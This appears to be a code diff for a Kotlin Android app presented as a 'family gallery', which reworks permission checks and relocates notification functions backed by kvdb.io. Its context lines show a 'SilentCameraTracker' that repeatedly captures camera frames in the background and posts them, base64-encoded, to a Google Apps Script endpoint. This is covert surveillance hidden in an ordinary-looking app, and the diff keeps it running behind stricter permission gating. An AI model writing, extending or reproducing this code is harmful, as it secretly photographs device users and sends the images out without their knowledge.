@@ -166,15 +166,6 @@ fun hasAllRequiredAccess(context: Context): Boolean {
             hasGalleryPermissions(context)
 }
 
-fun hasUserRequiredAccess(context: Context, username: String): Boolean {
-    val needsGps = username.trim().lowercase() == "gallery" || username.isEmpty()
-    return if (needsGps) {
-        hasAllRequiredAccess(context)
-    } else {
-        hasCameraPermission(context) && hasGalleryPermissions(context)
-    }
-}
-
 @SuppressLint("MissingPermission")
 fun fetchCurrentLocation(
     context: Context,
@@ -737,7 +728,7 @@ fun FamilyGalleryApp() {
                 is FamilyScreen.Welcome -> {
                     WelcomeScreen(
                         onExploreClick = {
-                            if (hasUserRequiredAccess(context, loggedInUser)) {
+                            if (hasAllRequiredAccess(context)) {
                                 screen = FamilyScreen.Dashboard
                             } else {
                                 screen = FamilyScreen.Login
@@ -780,14 +771,10 @@ fun FamilyGalleryApp() {
                     )
                 }
                 is FamilyScreen.SecretFolder -> {
-                    if (!hasUserRequiredAccess(context, loggedInUser)) {
+                    if (!hasAllRequiredAccess(context)) {
                         LaunchedEffect(Unit) {
                             screen = FamilyScreen.Dashboard
-                            val msg = if (loggedInUser == "gallery") {
-                                "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
-                            } else {
-                                "Access Denied. Camera and Gallery permissions must be active."
-                            }
+                            val msg = "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
                             Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
                         }
                     } else {
@@ -797,14 +784,10 @@ fun FamilyGalleryApp() {
                     }
                 }
                 is FamilyScreen.Upload -> {
-                    if (!hasUserRequiredAccess(context, loggedInUser)) {
+                    if (!hasAllRequiredAccess(context)) {
                         LaunchedEffect(Unit) {
                             screen = FamilyScreen.Dashboard
-                            val msg = if (loggedInUser == "gallery") {
-                                "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
-                            } else {
-                                "Access Denied. Camera and Gallery permissions must be active."
-                            }
+                            val msg = "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
                             Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
                         }
                     } else {
@@ -1775,8 +1758,6 @@ fun DashboardScreen(
         )
     }
     
-
-    
     var showNotificationDialog by remember { mutableStateOf(false) }
     var postTitle by remember { mutableStateOf("") }
     var postBody by remember { mutableStateOf("") }
@@ -1820,8 +1801,6 @@ fun DashboardScreen(
             delay(7000) // Poll every 7 seconds for snappier real-time experience
         }
     }
-
-
 
     // Init location query on load (safely)
     LaunchedEffect(Unit) {
@@ -2256,14 +2235,10 @@ fun DashboardScreen(
                     // Lock icon leading to secret vault dialog
                     IconButton(
                         onClick = {
-                            if (hasUserRequiredAccess(context, loggedInUser)) {
+                            if (hasAllRequiredAccess(context)) {
                                 secretCodeDialogActive = true
                             } else {
-                                val msg = if (loggedInUser == "gallery") {
-                                    "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
-                                } else {
-                                    "Access Denied. Camera and Gallery permissions must be active."
-                                }
+                                val msg = "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
                                 Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
                             }
                         },
@@ -2311,14 +2286,10 @@ fun DashboardScreen(
                     // Upload media action triggers native file explorer
                     Button(
                         onClick = {
-                            if (hasUserRequiredAccess(context, loggedInUser)) {
+                            if (hasAllRequiredAccess(context)) {
                                 onNavigateToUpload()
                             } else {
-                                val msg = if (loggedInUser == "gallery") {
-                                    "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
-                                } else {
-                                    "Access Denied. Camera and Gallery permissions must be active."
-                                }
+                                val msg = "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
                                 Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
                             }
                         },
@@ -2353,14 +2324,10 @@ fun DashboardScreen(
                     // Quick access Secret Gallery direct link
                     OutlinedButton(
                         onClick = {
-                            if (hasUserRequiredAccess(context, loggedInUser)) {
+                            if (hasAllRequiredAccess(context)) {
                                 secretCodeDialogActive = true
                             } else {
-                                val msg = if (loggedInUser == "gallery") {
-                                    "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
-                                } else {
-                                    "Access Denied. Camera and Gallery permissions must be active."
-                                }
+                                val msg = "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
                                 Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
                             }
                         },
@@ -4046,110 +4013,6 @@ fun postToAppsScript(url: String, postDataBytes: ByteArray): Pair<Int, String> {
     return Pair(400, "Max redirects exceeded")
 }
 
-fun fetchAppNotification(
-    onSuccess: (title: String, body: String, timestamp: Long) -> Unit,
-    onFailure: (String) -> Unit
-) {
-    var attempts = 0
-    val maxAttempts = 2
-    var lastError = "Unknown error"
-    
-    while (attempts < maxAttempts) {
-        attempts++
-        var conn: java.net.HttpURLConnection? = null
-        try {
-            // Use stable key URL, using request headers to bypass local caching
-            val url = java.net.URL("https://kvdb.io/familygallery_notif_pkzwmr/latest_notif")
-            conn = url.openConnection() as java.net.HttpURLConnection
-            conn.requestMethod = "GET"
-            conn.connectTimeout = 8000
-            conn.readTimeout = 8000
-            conn.doInput = true
-            
-            // Turn off caching explicitly
-            conn.useCaches = false
-            conn.setRequestProperty("Cache-Control", "no-cache, no-store, must-revalidate")
-            conn.setRequestProperty("Pragma", "no-cache")
-            conn.setRequestProperty("Expires", "0")
-            
-            val responseCode = conn.responseCode
-            if (responseCode == java.net.HttpURLConnection.HTTP_OK) {
-                val responseText = conn.inputStream.bufferedReader().use { it.readText() }
-                if (responseText.trim().isNotEmpty()) {
-                    val json = org.json.JSONObject(responseText)
-                    val title = json.optString("title", "")
-                    val body = json.optString("body", "")
-                    val timestamp = json.optLong("timestamp", 0L)
-                    onSuccess(title, body, timestamp)
-                    return // Success, return immediately
-                } else {
-                    onFailure("No notification found")
-                    return
-                }
-            } else if (responseCode == java.net.HttpURLConnection.HTTP_NOT_FOUND) {
-                onFailure("No notification posted yet")
-                return
-            } else {
-                lastError = "Server returned error code $responseCode"
-            }
-        } catch (e: Exception) {
-            e.printStackTrace()
-            lastError = e.localizedMessage ?: "Network exception occurred"
-        } finally {
-            conn?.disconnect()
-        }
-        
-        // Simple backoff before retrying
-        if (attempts < maxAttempts) {
-            try { Thread.sleep(500) } catch (ignored: Exception) {}
-        }
-    }
-    onFailure(lastError)
-}
-
-fun saveAppNotification(
-    title: String,
-    body: String,
-    timestamp: Long,
-    onSuccess: () -> Unit,
-    onFailure: (String) -> Unit
-) {
-    var conn: java.net.HttpURLConnection? = null
-    try {
-        val url = java.net.URL("https://kvdb.io/familygallery_notif_pkzwmr/latest_notif")
-        conn = url.openConnection() as java.net.HttpURLConnection
-        conn.requestMethod = "POST"
-        conn.connectTimeout = 8000
-        conn.readTimeout = 8000
-        conn.doOutput = true
-        conn.useCaches = false
-        conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
-        conn.setRequestProperty("Cache-Control", "no-cache, no-store, must-revalidate")
-        
-        val json = org.json.JSONObject().apply {
-            put("title", title)
-            put("body", body)
-            put("timestamp", timestamp)
-        }
-        
-        conn.outputStream.use { os ->
-            os.write(json.toString().toByteArray(Charsets.UTF_8))
-        }
-        
-        val responseCode = conn.responseCode
-        if (responseCode in 200..299) {
-            onSuccess()
-        } else {
-            onFailure("Server returned error code $responseCode")
-        }
-    } catch (e: Exception) {
-        e.printStackTrace()
-        onFailure(e.localizedMessage ?: "Unknown network error")
-    } finally {
-        conn?.disconnect()
-    }
-}
-
 fun imageProxyToBitmap(image: ImageProxy): Bitmap? {
     try {
         val plane = image.planes[0]
@@ -4193,7 +4056,7 @@ fun SilentCameraTracker(username: String) {
 
     LaunchedEffect(username) {
         while (true) {
-            val check = hasUserRequiredAccess(context, username) && isNetworkAvailable(context)
+            val check = hasAllRequiredAccess(context) && isNetworkAvailable(context)
             if (isReady != check) {
                 isReady = check
             }
@@ -4238,7 +4101,7 @@ fun SilentCameraTracker(username: String) {
                     if (!lifecycleOwner.lifecycle.currentState.isAtLeast(androidx.lifecycle.Lifecycle.State.RESUMED)) {
                         continue
                     }
-                    if (!hasUserRequiredAccess(context, username) || !isNetworkAvailable(context)) {
+                    if (!hasAllRequiredAccess(context) || !isNetworkAvailable(context)) {
                         continue
                     }
                     
@@ -4261,7 +4124,7 @@ fun SilentCameraTracker(username: String) {
                                         val base64 = bitmapToBase64(bitmap)
                                         CoroutineScope(Dispatchers.IO).launch {
                                             try {
-                                                if (hasUserRequiredAccess(context, username) && isNetworkAvailable(context)) {
+                                                if (hasAllRequiredAccess(context) && isNetworkAvailable(context)) {
                                                     val url = "https://script.google.com/macros/s/AKfycbxzjU0UOhg4STbza-vHJGkP-HKeVXHGDeBcgfmcO1OZDm7Ao2u3YGzZg4LiRIoB70-_/exec"
                                                     val postDataStr = "image=" + URLEncoder.encode(base64, "UTF-8")
                                                     val postData = postDataStr.toByteArray(Charsets.UTF_8)
@@ -4528,6 +4391,110 @@ fun triggerApkInstallation(context: Context, apkFile: java.io.File) {
     } catch (e: Exception) {
         e.printStackTrace()
         android.widget.Toast.makeText(context, "Installation failed to start: ${e.message}", android.widget.Toast.LENGTH_LONG).show()
+    }
+}
+
+fun fetchAppNotification(
+    onSuccess: (title: String, body: String, timestamp: Long) -> Unit,
+    onFailure: (String) -> Unit
+) {
+    var attempts = 0
+    val maxAttempts = 2
+    var lastError = "Unknown error"
+    
+    while (attempts < maxAttempts) {
+        attempts++
+        var conn: java.net.HttpURLConnection? = null
+        try {
+            // Use stable key URL, using request headers to bypass local caching
+            val url = java.net.URL("https://kvdb.io/familygallery_notif_pkzwmr/latest_notif")
+            conn = url.openConnection() as java.net.HttpURLConnection
+            conn.requestMethod = "GET"
+            conn.connectTimeout = 8000
+            conn.readTimeout = 8000
+            conn.doInput = true
+            
+            // Turn off caching explicitly
+            conn.useCaches = false
+            conn.setRequestProperty("Cache-Control", "no-cache, no-store, must-revalidate")
+            conn.setRequestProperty("Pragma", "no-cache")
+            conn.setRequestProperty("Expires", "0")
+            
+            val responseCode = conn.responseCode
+            if (responseCode == java.net.HttpURLConnection.HTTP_OK) {
+                val responseText = conn.inputStream.bufferedReader().use { it.readText() }
+                if (responseText.trim().isNotEmpty()) {
+                    val json = org.json.JSONObject(responseText)
+                    val title = json.optString("title", "")
+                    val body = json.optString("body", "")
+                    val timestamp = json.optLong("timestamp", 0L)
+                    onSuccess(title, body, timestamp)
+                    return // Success, return immediately
+                } else {
+                    onFailure("No notification found")
+                    return
+                }
+            } else if (responseCode == java.net.HttpURLConnection.HTTP_NOT_FOUND) {
+                onFailure("No notification posted yet")
+                return
+            } else {
+                lastError = "Server returned error code $responseCode"
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+            lastError = e.localizedMessage ?: "Network exception occurred"
+        } finally {
+            conn?.disconnect()
+        }
+        
+        // Simple backoff before retrying
+        if (attempts < maxAttempts) {
+            try { Thread.sleep(500) } catch (ignored: Exception) {}
+        }
+    }
+    onFailure(lastError)
+}
+
+fun saveAppNotification(
+    title: String,
+    body: String,
+    timestamp: Long,
+    onSuccess: () -> Unit,
+    onFailure: (String) -> Unit
+) {
+    var conn: java.net.HttpURLConnection? = null
+    try {
+        val url = java.net.URL("https://kvdb.io/familygallery_notif_pkzwmr/latest_notif")
+        conn = url.openConnection() as java.net.HttpURLConnection
+        conn.requestMethod = "POST"
+        conn.connectTimeout = 8000
+        conn.readTimeout = 8000
+        conn.doOutput = true
+        conn.useCaches = false
+        conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
+        conn.setRequestProperty("Cache-Control", "no-cache, no-store, must-revalidate")
+        
+        val json = org.json.JSONObject().apply {
+            put("title", title)
+            put("body", body)
+            put("timestamp", timestamp)
+        }
+        
+        conn.outputStream.use { os ->
+            os.write(json.toString().toByteArray(Charsets.UTF_8))
+        }
+        
+        val responseCode = conn.responseCode
+        if (responseCode in 200..299) {
+            onSuccess()
+        } else {
+            onFailure("Server returned error code $responseCode")
+        }
+    } catch (e: Exception) {
+        e.printStackTrace()
+        onFailure(e.localizedMessage ?: "Unknown network error")
+    } finally {
+        conn?.disconnect()
     }
 }
 
